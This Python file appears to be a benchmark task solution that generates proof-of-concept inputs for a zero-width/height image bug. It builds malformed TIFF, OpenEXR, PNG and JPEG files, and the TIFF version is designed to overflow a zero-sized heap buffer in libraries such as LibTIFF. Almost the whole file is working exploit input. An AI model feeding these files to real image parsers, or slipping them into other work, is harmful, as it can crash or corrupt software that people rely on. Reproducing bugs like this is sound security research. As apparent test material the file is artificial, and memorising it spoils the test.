import struct
import os
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability description "zero width or height images are not checked"
        typically leads to a heap buffer overflow when a library calculates buffer
        sizes based on these dimensions (resulting in a 0-byte allocation) but then
        attempts to write data into the buffer based on other parameters (like
        file size or strip byte counts).
        """
        filename = os.path.basename(src_path).lower() if src_path else ""

        if "exr" in filename or "openexr" in filename:
            return self.generate_openexr()
        elif "png" in filename:
            return self.generate_png()
        elif "jpg" in filename or "jpeg" in filename:
            return self.generate_jpeg()
        else:
            # Default to TIFF. This targets LibTIFF and LibRaw, which are common
            # targets for this type of vulnerability in OSS-Fuzz.
            return self.generate_tiff()

    def generate_tiff(self) -> bytes:
        # Generate a TIFF with ImageWidth=0.
        # Vulnerable parsers may allocate 0 bytes for the row buffer but try to read
        # 'StripByteCounts' bytes into it, causing a heap overflow.
        
        # TIFF Header: Little Endian ('II'), Version 42, Offset to IFD (8)
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # IFD Entries
        # We set Width=0, Height=10.
        # We set StripByteCounts to a large value (2048) to ensure we write past the 0-sized buffer.
        tags = [
            (256, 4, 1, 0),        # ImageWidth = 0 (TRIGGER)
            (257, 4, 1, 10),       # ImageLength = 10
            (258, 3, 1, 8),        # BitsPerSample = 8
            (259, 3, 1, 1),        # Compression = 1 (None)
            (262, 3, 1, 1),        # PhotometricInterpretation = 1 (BlackIsZero)
            (277, 3, 1, 1),        # SamplesPerPixel = 1
            (278, 4, 1, 10),       # RowsPerStrip = 10
            # 273 (StripOffsets) and 279 (StripByteCounts) added below
        ]
        
        num_tags = len(tags) + 2
        
        # Calculate offsets
        # Header (8) + IFD Count (2) + Tags (12 * num_tags) + NextIFD (4)
        ifd_size = 2 + 12 * num_tags + 4
        data_offset = 8 + ifd_size
        
        tags.append((273, 4, 1, data_offset))      # StripOffsets -> points to payload
        tags.append((279, 4, 1, 2048))             # StripByteCounts -> large enough to overflow
        
        # TIFF tags must be sorted by tag ID
        tags.sort(key=lambda x: x[0])
        
        # Construct IFD
        ifd = struct.pack('<H', num_tags)
        for t in tags:
            # Tag, Type, Count, Value/Offset
            ifd += struct.pack('<HHII', *t)
        ifd += struct.pack('<I', 0) # Next IFD offset (0 = none)
        
        # Payload data
        payload = b'A' * 2048
        
        return header + ifd + payload

    def generate_openexr(self) -> bytes:
        # Generate an OpenEXR file with a zero-width dataWindow.
        # If unchecked, this can lead to invalid calculations and heap corruption.
        magic = b'\x76\x2f\x31\x01'
        version = b'\x02\x00\x00\x00'
        
        def attr(name, type_name, val):
            return name.encode() + b'\x00' + type_name.encode() + b'\x00' + struct.pack('<I', len(val)) + val
            
        # dataWindow: xMin=0, yMin=0, xMax=-1, yMax=0. Width = xMax - xMin + 1 = 0.
        dw = struct.pack('<iiii', 0, 0, -1, 0)
        disp = struct.pack('<iiii', 0, 0, 0, 0)
        
        ch = b'R\x00' + struct.pack('<I', 1) + b'\x00\x00\x00' + struct.pack('<II', 1, 1) + b'\x00'
        
        head = attr('channels', 'chlist', ch)
        head += attr('compression', 'compression', b'\x00')
        head += attr('dataWindow', 'box2i', dw)
        head += attr('displayWindow', 'box2i', disp)
        head += attr('lineOrder', 'lineOrder', b'\x00')
        head += attr('pixelAspectRatio', 'float', struct.pack('<f', 1.0))
        head += attr('screenWindowCenter', 'v2f', struct.pack('<ff', 0.0, 0.0))
        head += attr('screenWindowWidth', 'float', struct.pack('<f', 1.0))
        head += b'\x00' # End of header
        
        return magic + version + head + b'\x00' * 1024

    def generate_png(self) -> bytes:
        # PNG with Width=0
        sig = b'\x89PNG\r\n\x1a\n'
        # IHDR: Width=0, Height=10, BitDepth=8, ColorType=2 (Truecolor)
        ihdr = struct.pack('>IIBBBBB', 0, 10, 8, 2, 0, 0, 0)
        
        def chunk(tag, data):
            crc = zlib.crc32(tag + data) & 0xffffffff
            return struct.pack('>I', len(data)) + tag + data + struct.pack('>I', crc)
            
        return sig + chunk(b'IHDR', ihdr) + chunk(b'IDAT', b'') + chunk(b'IEND', b'')

    def generate_jpeg(self) -> bytes:
        # JPEG with SOF0 Width=0
        sof = struct.pack('>BHHB', 8, 10, 0, 1) + b'\x01\x11\x00'
        return b'\xff\xd8' + b'\xff\xc0' + struct.pack('>H', 2+len(sof)) + sof + b'\xff\xd9'
